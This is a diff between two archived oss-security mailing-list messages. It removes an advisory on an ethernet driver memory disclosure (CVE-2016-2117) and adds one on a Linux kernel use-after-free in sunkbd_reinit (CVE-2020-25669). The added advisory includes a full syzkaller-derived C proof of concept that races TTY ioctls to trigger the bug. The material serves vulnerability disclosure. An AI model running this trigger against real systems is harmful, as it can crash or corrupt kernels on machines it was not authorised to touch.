@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2623" "Wednesday" "16" "March" "2016" "03:00:00" "+0000" "Justin Yackoski" "jyackoski@crypto-nite.com" "<BY2PR15MB0728301B880CC40FFD658066E98A0@BY2PR15MB0728.namprd15.prod.outlook.com>" "112" "[oss-security] CVE-2016-2117 memory disclosure to ethernet due to unchecked scatter/gather IO" "^Date:" nil nil "3" "2016031603:00:00" "[oss-security] CVE-2016-2117 memory disclosure to ethernet due to unchecked scatter/gather IO" (number mark "U       jyackoski@cr Mar 16  112/2623  " thread-indent "\"[oss-security] CVE-2016-2117 memory disclosure to ethernet due to unchecked scatter/gather IO\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4686" "Thursday" "5" "November" "2020" "09:52:09" "+0800" "- Nop" "nopitydays@gmail.com" "<CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>" "212" "[oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" nil nil nil "11" "2020110501:52:09" "[oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" (number mark "U       nopitydays@g Nov  5  212/4686  " thread-indent "\"[oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 5322 invoked by uid 550); 16 Mar 2016 12:53:18 -0000
+Received: (qmail 14268 invoked by uid 550); 5 Nov 2020 06:01:13 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,158 +11,250 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 20331 invoked from network); 16 Mar 2016 03:00:15 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=cryptonite.onmicrosoft.com; s=selector1-cryptonite-com01e;
- h=From:To:Date:Subject:Message-ID:Content-Type:MIME-Version;
- bh=leuGBRD+SeDpHSd1yRBBgDEmRkW+i8tq+IBLuOcjtQg=;
- b=AhXLQGsgf1xAuF4iNL1/QnIYLYi8ZS0tN778ifK2irQeLm+Pg83fsJHHYWc9ERSvVx2744s+5h2NpLutmuGHF+Y8cKecqhB3b4SW8NSimHFc6wnEw+HBQzN4yOVL9gkyTB6ui98YbGkRNfHVIIW74c3lbXYSwuTt3fpU3RPugN0=
-Thread-Topic: CVE-2016-2117 memory disclosure to ethernet due to unchecked
- scatter/gather IO
-Thread-Index: AQHRfy6zwhc1Q+4FY0Gkm9Ry7juC2w==
-Message-ID: <BY2PR15MB0728301B880CC40FFD658066E98A0@BY2PR15MB0728.namprd15.prod.outlook.com>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-authentication-results: i-a-i.com; dkim=none (message not signed)
- header.d=none;i-a-i.com; dmarc=none action=none header.from=crypto-nite.com;
-x-originating-ip: [108.48.153.209]
-x-ms-office365-filtering-correlation-id: f7e3ed0e-8259-4626-b8c9-08d34d4710c4
-x-microsoft-exchange-diagnostics: 1;BY2PR15MB0727;5:78iv1cXiv4roJ8LmqV4XrkQ8aas1vRidlkBia+VJaP2LM+hLvBNgjHBuAcseeiVALKF5rxnQrUMGVg8op0GhL2meY3zlF+ew9SSmQDlG29/F0qyGVED8NvBEEIgfkaA1ZVjPgMiIz6YQfvf+aqySRA==;24:WUHgtRUAGWhYCsXkqV+3tLHpcho22Sj/zRDcztvhaoD/30sOoPjDwVIMGQSnZpv/FBx7fjYTaDTc5ZJo93idoxQmTSSHYJbKY/ut5361uG8=
-x-microsoft-antispam: UriScan:;BCL:0;PCL:0;RULEID:;SRVR:BY2PR15MB0727;
-x-microsoft-antispam-prvs: <BY2PR15MB07278A952FEA870BAC7D91EDE98A0@BY2PR15MB0727.namprd15.prod.outlook.com>
-x-exchange-antispam-report-test: UriScan:;
-x-exchange-antispam-report-cfa-test: BCL:0;PCL:0;RULEID:(6040046)(601004)(2401047)(5005006)(8121501046)(10201501046)(3002001)(6041046)(6043046);SRVR:BY2PR15MB0727;BCL:0;PCL:0;RULEID:;SRVR:BY2PR15MB0727;
-x-forefront-prvs: 08831F51DC
-x-forefront-antispam-report: SFV:NSPM;SFS:(10009020)(6009001)(50944005)(122556002)(66066001)(2501003)(110136002)(19625215002)(16236675004)(11100500001)(107886002)(189998001)(33656002)(5002640100001)(2906002)(10400500002)(3280700002)(5004730100002)(50986999)(92566002)(230783001)(5008740100001)(54356999)(74316001)(81166005)(99286002)(229853001)(2351001)(86362001)(106116001)(76576001)(1096002)(1220700001)(3846002)(2900100001)(102836003)(87936001)(6116002)(5003600100002)(19627405001)(3660700001)(586003)(77096005)(7059030);DIR:OUT;SFP:1101;SCL:1;SRVR:BY2PR15MB0727;H:BY2PR15MB0728.namprd15.prod.outlook.com;FPR:;SPF:None;MLV:sfv;LANG:en;
-spamdiagnosticoutput: 1:23
-spamdiagnosticmetadata: NSPM
-Content-Type: multipart/alternative;
-	boundary="_000_BY2PR15MB0728301B880CC40FFD658066E98A0BY2PR15MB0728namp_"
-MIME-Version: 1.0
-X-OriginatorOrg: crypto-nite.com
-X-MS-Exchange-CrossTenant-originalarrivaltime: 16 Mar 2016 03:00:00.6997
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: b7d6ebb9-d6a8-41ae-8311-0cf65a93ce5f
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: BY2PR15MB0727
-Date: Wed, 16 Mar 2016 03:00:00 +0000
-From: Justin Yackoski <jyackoski@crypto-nite.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE-2016-2117 memory disclosure to ethernet due to unchecked
- scatter/gather IO
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
+Received: (qmail 5127 invoked from network); 5 Nov 2020 01:52:32 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=jFm4vlYFajjJJ7CzX9DJSLr0iKRJAtJK5M716MAG9U4=;
+        b=AC7BcehWN6iwhD1Bs2F0B7vqHvN2Ecx0znfJKiOfqdhycL2hqjvkr68dheydfKMY/O
+         Qyf/xcPOrHUBHroipGBMkZsSSQP+508ZvJDYR2O71LIewLA0w5J6R8cTst0PM7FGhq9B
+         fzI5TCT+l4wdX+c5pQoPJJS2kjWQUCWq3g6efeIFec8EAvbLty/ez2unjziOqkJtovi7
+         6O+YXTNxAi0ppq8ufv6rTu8VghFHLFaW04AGbVfkvspqJadtrEeGWS7N7jnNTjAPiNmF
+         qSxRrHhFa9hhGnLYhdnbM2ZhcYZSkY2CTsLZ06mUr1vc1q601lbKc+9YCd+xx0YNFAed
+         fO9g==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=jFm4vlYFajjJJ7CzX9DJSLr0iKRJAtJK5M716MAG9U4=;
+        b=L6Oy9YQ4XyYIPcRZCP+nVV112Kw+A6iGqOEo+7Ch5BiEv3mgh+kFLk3YmHsYCjTHLg
+         YznZc7X2FuqxZrqxVL0WwKCFlDrzbhdQJD5ZDhGG9sp6D4HejXzymVxHUZhsAuT4cGeM
+         6PVeDSuf3gq3Jse6nNhB5FQodhFKFUEGkKrpVmre9dHtVAIOlhRaGGy6Hn2XV/9nLJ7H
+         Po1zxVO+KU8YKpmEdzrFVt/DRU1sXXP7ODpBpdcqvasV2a1EqTZikF8rc11iNiib4myW
+         AYoxfxni7+XUniQoeIVFelnHqlGbWiI+JxjLfb9npmuc7j5Ty7mg7CHEESPIrDJjgkKU
+         CvMQ==
+X-Gm-Message-State: AOAM531J61go4ZCXaVTG1VOtyTVZZsOCz3qt0A0z27KhISnJ/jpSs3gr
+	032UZ+ZeJNqXlzAVfvfKVBDRB5LZuBrns4x6EhxJ6YTqI25iEw==
+X-Google-Smtp-Source: ABdhPJyDf3tE192iTdJ4hHmK6VfEcsai/3KSHcSWcBp7CpfV6tjan/J7clQc8cD/r4UCrc3TBhhlcTOP+0cfPtXONR0=
+X-Received: by 2002:a1c:7dc8:: with SMTP id y191mr373238wmc.118.1604541140602;
+ Wed, 04 Nov 2020 17:52:20 -0800 (PST)
+MIME-Version: 1.0
+From: - Nop <nopitydays@gmail.com>
+Date: Thu, 5 Nov 2020 09:52:09 +0800
+Message-ID: <CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="000000000000b6948205b352588a"
+Subject: [oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit
 
---_000_BY2PR15MB0728301B880CC40FFD658066E98A0BY2PR15MB0728namp_
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
+--000000000000b6948205b352588a
+Content-Type: text/plain; charset="UTF-8"
 
-CVE-2016-2117 memory disclosure to ethernet due to unchecked scatter/gather=
- IO
+Hi,
 
+We found a use-after-free read in sunkbd_reinit located in
+drivers/input/keyboard/sunkbd.c,
+and reproduced it in the latest kernel version (v5.9.4 for now) with
+CONFIG_KEYBOARD_SUNKBD=y and CONFIG_KASAN=y.
 
-Affects:
+The root cause of this BUG is :
 
-In-tree Linux ethernet drivers:
+The function sunkbd_reinit having been scheduled by sunkbd_interrupt before
+the struct sunkbd being freed.
+Though the dangling pointer is set to NULL in sunkbd_disconnect, there is
+still an alias in sunkbd_reinit thus causing UAF.
 
-atheros/atlx/atl2.c  confirmed in versions 3.8 thru 4.5 (possibly earlier)
+Timeline:
+* 2020/10/21 - Vulnerability reported to security@kernel.org.
+* 2020/10/27 - Vulnerability reported to linux-distros@vs.openwall.org.
+* 2020/10/27 - CVE-2020-25669 assigned.
+* 2020/11/05 - Vulnerability opened.
 
-* see description for more details on other potential less severe impacts
+Regards,
+Bodong Zhao from Tsinghua University
 
+------------------------------------
+PoC:
 
-Description:
+// autogenerated by syzkaller (https://github.com/google/syzkaller)
+// nop@THU
+#define _GNU_SOURCE
 
-When scatter/gather IO is enabled (NETIF_F_SG), the ethernet driver may be =
-passed a
+#include <endian.h>
+#include <errno.h>
+#include <pthread.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
+#include <fcntl.h>
 
-list of buffers containing the packet to be sent, rather than a single cont=
-iguous buffer
+#include <linux/futex.h>
 
-in order to improve performance.  If a driver claims to support scatter/gat=
-her but does
+static void sleep_ms(uint64_t ms)
+{
+  usleep(ms * 1000);
+}
 
-a simple memcpy, dma_map_single, or similar call from skb->data to skb->len=
- the result
+static uint64_t current_time_ms(void)
+{
+  struct timespec ts;
+  if (clock_gettime(CLOCK_MONOTONIC, &ts))
+    exit(1);
+  return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
+}
 
-is that the outgoing packet will be sent containing the first full fragment=
- followed by
+static void thread_start(void* (*fn)(void*), void* arg)
+{
+  pthread_t th;
+  pthread_attr_t attr;
+  pthread_attr_init(&attr);
+  pthread_attr_setstacksize(&attr, 128 << 10);
+  int i;
+  for (i = 0; i < 100; i++) {
+    if (pthread_create(&th, &attr, fn, arg) == 0) {
+      pthread_attr_destroy(&attr);
+      return;
+    }
+    if (errno == EAGAIN) {
+      usleep(50);
+      continue;
+    }
+    break;
+  }
+  exit(1);
+}
 
-whatever kernel memory was at the end of that first fragment.  This data is=
- likely to be
+typedef struct {
+  int state;
+} event_t;
 
-other data from other skb's, but other sensitive data has been seen.  If ha=
-rdware
+static void event_init(event_t* ev)
+{
+  ev->state = 0;
+}
 
-checksumming is enabled, the resulting ethernet frame will be valid other t=
-han containing
+static void event_reset(event_t* ev)
+{
+  ev->state = 0;
+}
 
-the disclosed memory.
+static void event_set(event_t* ev)
+{
+  if (ev->state)
+    exit(1);
+  __atomic_store_n(&ev->state, 1, __ATOMIC_RELEASE);
+  syscall(SYS_futex, &ev->state, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1000000);
+}
 
+static void event_wait(event_t* ev)
+{
+  while (!__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
+    syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, 0);
+}
 
-This bug is remotely exploitable in the atl2 driver whenever scatter/gather=
- IO is triggered,
+static int event_isset(event_t* ev)
+{
+  return __atomic_load_n(&ev->state, __ATOMIC_ACQUIRE);
+}
 
-which can be done in some common applications (pcap samples available upon =
-request).
+static int event_timedwait(event_t* ev, uint64_t timeout)
+{
+  uint64_t start = current_time_ms();
+  uint64_t now = start;
+  for (;;) {
+    uint64_t remain = timeout - (now - start);
+    struct timespec ts;
+    ts.tv_sec = remain / 1000;
+    ts.tv_nsec = (remain % 1000) * 1000 * 1000;
+    syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, &ts);
+    if (__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
+      return 1;
+    now = current_time_ms();
+    if (now - start > timeout)
+      return 0;
+  }
+}
 
+struct thread_t {
+  int created, call;
+  event_t ready, done;
+};
 
-Note that this bug was originally found in an out of tree driver (CVE-2016-=
-2553), and may
+static struct thread_t threads[2];
+static void execute_call(int call);
+static int running;
 
-go unnoticed in similar drivers until the right conditions for scatter/gath=
-er IO are hit.
+static void* thr(void* arg)
+{
+  struct thread_t* th = (struct thread_t*)arg;
+  for (;;) {
+    event_wait(&th->ready);
+    event_reset(&th->ready);
+    execute_call(th->call);
+    __atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
+    event_set(&th->done);
+  }
+  return 0;
+}
 
+static void loop(void)
+{
+  int i, call, thread;
+  for (call = 0; call < 2; call++) {
+    for (thread = 0; thread < (int)(sizeof(threads) / sizeof(threads[0]));
+         thread++) {
+      struct thread_t* th = &threads[thread];
+      if (!th->created) {
+        th->created = 1;
+        event_init(&th->ready);
+        event_init(&th->done);
+        event_set(&th->done);
+        thread_start(thr, th);
+      }
+      if (!event_isset(&th->done))
+        continue;
+      event_reset(&th->done);
+      th->call = call;
+      __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
+      event_set(&th->ready);
+      event_timedwait(&th->done, 45);
+      break;
+    }
+  }
+  for (i = 0; i < 100 && __atomic_load_n(&running, __ATOMIC_RELAXED); i++)
+    sleep_ms(1);
+}
 
-Apart from the atl2 driver that can be remotely exploited, other in-tree dr=
-ivers are not
+uint64_t fd;
+char buf[100];
 
-remotely exploitable but a local privileged user with access to kernel runt=
-ime memory
+void execute_call(int call)
+{
+  int disc = 0x2;
+  char ch = 0xff;
 
-may be able to cause a driver that does not check for skb fragments to star=
-t to behave
+  switch (call) {
+  case 0:
+    // call sunkbd_disconnect
+    read(fd, buf, 0);
+    break;
+  case 1:
+    // call sunkbd_interrupt
+    ioctl(fd, 0x5412, &ch); // TIOCSTI
+    break;
+  }
+}
+int main(void)
+{
+  int disc = 0x2;
+  fd = open("/dev/ptmx", O_RDWR, 0);
+  ioctl(fd, 0x5423, &disc); // TIOCSETD
+  loop();
+  return 0;
+}
 
-improperly.
-
-
-Mitigation:
-
-1) If using atl2 driver run the following at each boot (not confirmed due t=
-o lack of hardware
-
-          availability):
-
-    ethtool -K <ethX> sg off
-
-2) Other drivers that don't expect scatter/gather, ensure appropriate local=
- permissions.
-
-
-Recommended fixes:
-
-1) remove NETIF_F_SG from atl2.c
-
-2) if an ethernet driver does not handle scatter/gather, consider a run-tim=
-e check for
-
-     fragments in the ndo_start_xmit handler rather than a compile time-ass=
-umption for maximum
-
-     security.
-
-
-Patches:
-
-None available currently, although in atl2 simply remove the NETIF_F_SG ide=
-ntifier from the
-
-hw_features of the net device structure.
-
-
-Credits:
-
-Justin Yackoski @ Cryptonite
-
-
---_000_BY2PR15MB0728301B880CC40FFD658066E98A0BY2PR15MB0728namp_--
+--000000000000b6948205b352588a--
